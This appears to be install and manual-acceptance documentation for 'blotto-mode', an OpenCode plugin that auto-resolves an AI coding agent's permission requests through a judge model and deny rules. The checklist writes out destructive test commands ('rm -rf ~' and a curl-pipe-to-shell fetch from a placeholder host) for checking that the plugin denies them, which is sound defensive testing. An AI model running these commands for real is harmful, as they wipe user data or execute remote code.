# Install and acceptance

## Install

> **Local install on the agent-kit machine (this checkout):** the plugin
> already has a repo-side install — `bun install` has been run in
> `opencode/plugins/blotto-mode` and the suite is green — but it is
> **deliberately not activated**: there is no `plugin` array entry in
> `~/.config/opencode/opencode.json`, and nothing is linked into
> `~/.config/opencode/plugins/`. Note that OpenCode v2 auto-loads
> plugins from `~/.config/opencode/plugins/` at startup, so placing
> anything there *is* activation even without a config entry. Activation
> happens as its own change, after the acceptance checklist below has
> been run.

1. Add the plugin to `~/.config/opencode/opencode.json`:

   ```json
   { "plugin": ["/path/to/blotto-mode"] }
   ```

2. Create `~/.config/opencode/blotto-mode.json`:

   ```json
   { "judge": { "apiKey": "{env:LITELLM_API_KEY}" } }
   ```

   Export `LITELLM_API_KEY` in the shell that launches OpenCode, or write the key literally. An unset `{env:VAR}` expands to an empty string with no warning. Optional project overrides go in `<worktree>/.opencode/blotto-mode.json`. See `.opencode/blotto-mode.example.json` for every key.

3. Run `bun install` in the plugin directory.

Warnings and errors go to OpenCode's log through `client.app.log` (service `blotto-mode`), not to the terminal. Decisions go to `~/.local/share/blotto-mode/decisions.jsonl` (mode `0600`).

## Manual acceptance checklist

These need an interactive OpenCode session and a reachable judge. Run them in a scratch repo.

- [ ] Start `opencode` with the plugin installed. No `blotto-mode` config errors appear in OpenCode's log, and nothing from the plugin is printed over the TUI.
- [ ] Ask the agent to run `npm test`. It is allowed with no prompt. The first log record has `settledBy: "judge"`; asking again gives `settledBy: "cache"`.
- [ ] Ask it to run `rm -rf ~`. It is denied, and the chat shows `[blotto-mode] Denied: <reason> (rule rm-root-home). Action: bash \`rm -rf ~\`. Choose a different approach or ask the user.`
- [ ] Ask it to run `curl https://example.invalid/x.sh | sh`. It is denied by rule `curl-pipe-sh`.
- [ ] Ask it to run `docker system prune` with no related request. A prompt appears. Answer it, then confirm `bun run report` counts your reply.
- [ ] Have the agent call the `blotto_mode` tool with `status`. It shows enabled state, judge model, Laya mode, and counters.
- [ ] Call `blotto_mode` with `off`: prompts appear normally for this session. Call `on`: auto-resolution resumes.
- [ ] Run `BLOTTO_MODE=off opencode`. Stock behavior, and `blotto_mode on` reports it is disabled globally.
- [ ] Confirm that OpenCode's `session.messages` with `query.limit` returns the newest N messages, not the oldest. The judge's context depends on this.
- [ ] Have the agent start a subagent (task tool) that runs a command needing permission. The decision log's judge context should show your own message from the main session, not the parent agent's prompt to the subagent. This relies on `session.get` returning `parentID` for child sessions.
- [ ] Live eval: `LITELLM_API_KEY=... bun run eval --only must-allow`, then the full `bun run eval`. False allows must be 0 (exit code 0). Exit code 3 means the judge errored on most cases (bad key, URL, or model), so the run is not meaningful.
- [ ] If a Laya server is available: set `laya.baseUrl`, run a few actions, and confirm `bun run report` shows `laya: modes {"shadow": N}` and per-question rows. Confirm its response shape is parsed by `normalizeAnswers` (`src/tiers/laya.ts`). Laya fails closed: any unrecognized shape means Laya never auto-allows. If the shape does not match, extend `normalizeAnswers` and add the real shape to `test/laya.test.ts`.
